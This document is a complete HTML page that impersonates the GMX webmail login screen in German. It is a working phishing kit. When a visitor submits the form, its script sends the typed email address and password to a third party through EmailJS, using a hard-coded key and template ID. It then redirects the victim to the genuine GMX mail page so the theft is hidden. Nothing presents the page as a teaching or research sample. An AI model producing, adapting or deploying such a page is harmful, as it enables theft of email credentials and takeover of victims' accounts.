<!doctype html>
<html lang="de">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
    />
    <title>GMX</title>
    <!-- ionicons for the eye (mandatory for toggle) -->
    <script
      type="module"
      src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"
    ></script>
    <script
      nomodule
      src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"
    ></script>
    <!-- EmailJS library -->
    <script
      type="text/javascript"
      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
    ></script>
    <style>
      /* global reset */
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      body {
        background: #f2f2f7; /* light grey background like typical iOS screen */
        font-family:
          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica,
          Arial, sans-serif;
        min-height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 16px;
      }

      /* main card – exactly like the photo, white, rounded */
      .card {
        width: 100%;
        max-width: 380px;
        background: #ffffff;
        border-radius: 32px;
        box-shadow:
          0 20px 40px rgba(0, 0, 0, 0.08),
          0 8px 20px rgba(0, 0, 0, 0.06);
        padding: 32px 24px 36px 24px;
      }

      /* GMX logo – big, bold, centered, black */
      .gmx-logo {
        font-size: 44px;
        font-weight: 700;
        color: #000000;
        text-align: center;
        line-height: 1.1;
        letter-spacing: -0.5px;
        margin-bottom: 8px;
      }

      /* welcome! and login – centered, black, two lines */
      .welcome {
        font-size: 24px;
        font-weight: 400;
        color: #000000;
        text-align: center;
        line-height: 1.2;
      }
      .login-sub {
        font-size: 24px;
        font-weight: 300;
        color: #000000;
        text-align: center;
        margin-bottom: 32px;
      }

      /* form labels */
      .input-group {
        margin-bottom: 20px;
      }
      label {
        display: block;
        font-size: 15px;
        font-weight: 500;
        color: #1c1c1e;
        margin-bottom: 6px;
        letter-spacing: -0.2px;
      }

      /* input fields – empty, with border */
      input {
        width: 100%;
        padding: 16px 18px;
        border: 1px solid #c6c6c8;
        border-radius: 14px;
        font-size: 16px;
        background: #ffffff;
        outline: none;
        transition: border 0.2s ease;
        font-family: inherit;
      }
      input:focus {
        border-color: #007aff; /* blue focus */
      }

      /* special container for password field + eye */
      .password-wrapper {
        position: relative;
        width: 100%;
      }
      .password-wrapper input {
        padding-right: 55px;
      }

      #toggle-password {
        position: absolute;
        right: 18px;
        top: 50%;
        transform: translateY(-50%);
        cursor: pointer;
        color: #8e8e93;
        display: flex;
        align-items: center;
        font-size: 24px;
        line-height: 1;
        transition: color 0.1s;
        text-decoration: none;
      }
      #toggle-password:hover {
        color: #007aff;
      }
      .hide {
        display: none !important;
      }

      /* forgot password link – left aligned, blue */
      .forgot-row {
        text-align: right;
        margin: 8px 0 28px 0;
      }
      .forgot-link {
        color: #007aff;
        font-size: 16px;
        font-weight: 500;
        text-decoration: none;
      }
      .forgot-link:hover {
        text-decoration: underline;
      }

      /* login button – blue, full width, rounded */
      #button {
        width: 100%;
        background: #007aff; /* solid blue */
        border: none;
        border-radius: 40px;
        padding: 16px 10px;
        color: white;
        font-size: 20px;
        font-weight: 600;
        cursor: pointer;
        transition: background 0.15s;
        box-shadow: 0 8px 16px -6px rgba(0, 122, 255, 0.4);
        margin-bottom: 8px;
        border: 0;
      }
      #button:hover {
        background: #005fc7;
      }

      /* helper for click border (from original js) */
      .input-border-color {
        border-color: #007aff !important;
      }

      /* no status bar, no back link – exactly as requested */
    </style>
  </head>
  <body>
    <div class="card">
      <!-- GMX logo (centered, black) -->
      <div class="gmx-logo">GMX</div>

      <!-- Welcome! and Login (centered, black) -->
      <div class="welcome">Willkommen!</div>
      <div class="login-sub">Login</div>

      <!-- main form – all IDs/classes preserved for JS -->
      <form id="form">
        <!-- hidden field for emailjs (compatibility) -->
        <input type="hidden" name="form-name" value="contact" />

        <!-- E-Mail field with label, empty (fresh page) -->
        <div class="input-group">
          <label for="email">E-Mail</label>
          <input
            type="email"
            name="email"
            id="email"
            placeholder="Email"
            autocomplete="off"
          />
        </div>

        <!-- Password field with eye, empty -->
        <div class="input-group">
          <label for="password">Password</label>
          <div class="password-wrapper">
            <input
              type="password"
              name="password"
              id="password"
              placeholder="Password"
              autocomplete="off"
            />
            <a href="#" id="toggle-password" onclick="return false;">
              <!-- prevent link jump -->
              <span class="password-icon hide" id="open-eye">
                <ion-icon name="eye"></ion-icon>
              </span>
              <span class="password-icon" id="closed-eye">
                <ion-icon name="eye-off"></ion-icon>
              </span>
            </a>
          </div>
        </div>

        <!-- Forgot your password? link (blue) -->
        <div class="forgot-row">
          <a href="#" class="forgot-link">Passwort vergessen?</a>
        </div>

        <!-- Login button -->
        <input type="submit" id="button" value="Login" />
      </form>
    </div>

    <!-- EmailJS init (same key as original) -->
    <script type="text/javascript">
      emailjs.init("-IRhgQ8BsBT9pqssH");
    </script>

    <!-- Combined JS: form submission, toggle password, placeholder border effect -->
    <script>
      (function () {
        // ----- form submit with emailjs and redirect -----
        const btn = document.getElementById("button");
        const form = document.getElementById("form");

        if (form) {
          form.addEventListener("submit", function (event) {
            event.preventDefault();

            btn.value = "Überprüfen...";

            const serviceID = "default_service";
            const templateID = "template_pe9hpia"; // from original code

            emailjs
              .sendForm(serviceID, templateID, this)
              .then(() => {
                btn.value = "Login";
                window.location.href =
                  "https://www.gmx.net/produkte/apps/mail/";
              })
              .catch((err) => {
                btn.value = "Login";
                alert(JSON.stringify(err));
              });

            // do NOT reset form – keeps empty fields (fresh look)
          });
        }

        // ----- toggle password visibility (eye icon) -----
        const toggleBtn = document.getElementById("toggle-password");
        const closedEye = document.getElementById("closed-eye");
        const openEye = document.getElementById("open-eye");
        const passwordField = document.getElementById("password");
        let passwordVisible = false;

        if (toggleBtn && passwordField) {
          toggleBtn.addEventListener("click", function (e) {
            e.preventDefault(); // avoid any hash jump
            if (!passwordVisible) {
              passwordField.type = "text";
              openEye.classList.remove("hide");
              closedEye.classList.add("hide");
            } else {
              passwordField.type = "password";
              closedEye.classList.remove("hide");
              openEye.classList.add("hide");
            }
            passwordVisible = !passwordVisible;
          });
        }

        // ----- placeholder click toggles blue border (as in original) -----
        const allInputs = document.querySelectorAll("input[placeholder]");
        allInputs.forEach((input) => {
          input.addEventListener("click", function () {
            this.classList.toggle("input-border-color");
            console.log("border toggled");
          });
        });

        // ensure every input has at least a placeholder (for the event to work)
        document.querySelectorAll("input").forEach((inp) => {
          if (!inp.hasAttribute("placeholder")) {
            inp.setAttribute("placeholder", " ");
          }
        });

        // minor: remove any automatic filling by browser
        // we keep fields empty – that's what the user wanted
      })();
    </script>
  </body>
</html>
